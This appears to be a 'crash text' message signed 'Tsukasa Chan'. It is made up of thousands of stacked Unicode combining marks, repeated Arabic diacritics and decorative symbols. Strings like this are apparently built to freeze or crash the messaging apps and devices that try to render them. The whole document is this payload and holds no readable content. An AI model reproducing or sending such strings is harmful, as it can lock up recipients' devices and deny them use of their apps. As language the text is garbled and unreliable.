↬❂⃢⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊❂❂⃟⃢͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟❂⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟❂⃢⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽❂⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟❂⃢⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊❂❂⃟⃢͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟❂⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟<\ 𝕿𝖘𝖚𝖐𝖆𝖘𝖆͜͡ 𝕮𝖍𝖆𝖓.々ʹ⁩𝜘͢͢ۦོ͢⇣͢✰͢𓊑𓀦𓀗𓀦𓀗𓊑ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝.⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙ุᡃᡃᡃᡃᡃᡃᡃᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ<\ 𝕿𝖘𝖚𝖐𝖆𝖘𝖆͜͡ 𝕮𝖍𝖆𝖓.々ʹ⁩𝜘͢͢ۦོ͢⇣͢✰͢ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝